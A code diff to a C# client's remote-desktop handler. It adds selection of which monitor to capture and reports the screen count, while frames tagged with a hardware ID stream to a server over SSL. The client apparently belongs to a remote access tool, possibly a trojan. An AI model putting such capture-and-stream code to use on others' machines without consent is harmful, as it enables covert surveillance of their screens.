@@ -18,7 +18,7 @@ namespace Client.Handle_Packet
 {
    public class HandleRemoteDesktop
     {
-        public void CaptureAndSend(int quality)
+        public void CaptureAndSend(int quality, int Scrn)
         {
             try
             {
@@ -37,7 +37,7 @@ namespace Client.Handle_Packet
                 while (Client.Connected)
                 {
                     if (!ClientSocket.Client.Connected || !ClientSocket.IsConnected) break;
-                    Bitmap bmp = GetScreen();
+                    Bitmap bmp = GetScreen(Scrn);
                     Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                     Size size = new Size(bmp.Width, bmp.Height);
                     BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);
@@ -51,7 +51,7 @@ namespace Client.Handle_Packet
                             msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                             msgpack.ForcePathObject("ID").AsString = hwid;
                             msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
-
+                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(System.Windows.Forms.Screen.AllScreens.Length);
                             SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
                             SslClient.Write(msgpack.Encode2Bytes());
                             SslClient.Flush();
@@ -64,14 +64,14 @@ namespace Client.Handle_Packet
             catch { }
         }
 
-        private Bitmap GetScreen()
+        private Bitmap GetScreen(int Scrn)
         {
-            Rectangle rect = Screen.AllScreens[0].WorkingArea;
+            Rectangle rect = Screen.AllScreens[Scrn].Bounds;
             try
             {
                 Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                 Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
-                gfxScreenshot.CopyFromScreen(0, 0, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
+                gfxScreenshot.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                 gfxScreenshot.Dispose();
                 return bmpScreenshot;
             }
